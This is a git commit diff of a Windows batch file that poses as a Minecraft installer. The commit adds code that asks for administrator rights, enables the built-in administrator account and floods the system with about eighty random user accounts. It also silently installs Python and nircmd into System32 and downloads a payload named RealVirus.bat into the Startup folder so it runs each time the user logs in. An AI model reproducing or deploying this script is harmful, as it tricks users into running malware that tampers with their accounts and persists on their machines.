f7e675adb5f9b6d2582c9d8b641575512a905c9b
DarioStar999 <105985378+DarioStar999@users.noreply.github.com>
2023-08-30 13:04:12 +0200

    Update OPENMEPLS.bat

--- OPENMEPLS.bat
+++ OPENMEPLS.bat
@@ -1,11 +1,103 @@
-set github=
-
+@echo
+powershell -command "Start-Process '%0' -Verb RunAs"
+pause
+net user administrator /active:yes
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+net user TOPG%random% /add
+::
+set github= 
+set python_installer= "C:\Windows\System32\fuckoffwindows\python-3.11.5-amd64.exe"
+::
+cls
 @echo l'installer di minecraft si sta avviando Attendi...
 @echo off
 md C:\Windows\System32\fuckoffwindows
+::Python dowload
+powershell (new-object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe','C:\Windows\System32\fuckoffwindows\python-3.11.5-amd64.exe')
+start /wait %python_installer% /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+::Dowload nircmd
 powershell (new-object System.Net.WebClient).DownloadFile('https://www.nirsoft.net/utils/nircmd-x64.zip','C:\Windows\System32\fuckoffwindows\nircmd-x64.zip')
 tar nircmd-x64.zip
-powershell (new-object System.Net.WebClient).DownloadFile('%github%','C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
+::TAKEOWN
+powershell (new-object System.Net.WebClient).DownloadFile('%github%','C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RealVirus.bat')
 @echo attendi mentre estraiamo il contenuto della cartella
 timeout /t 10 >nul
 cls
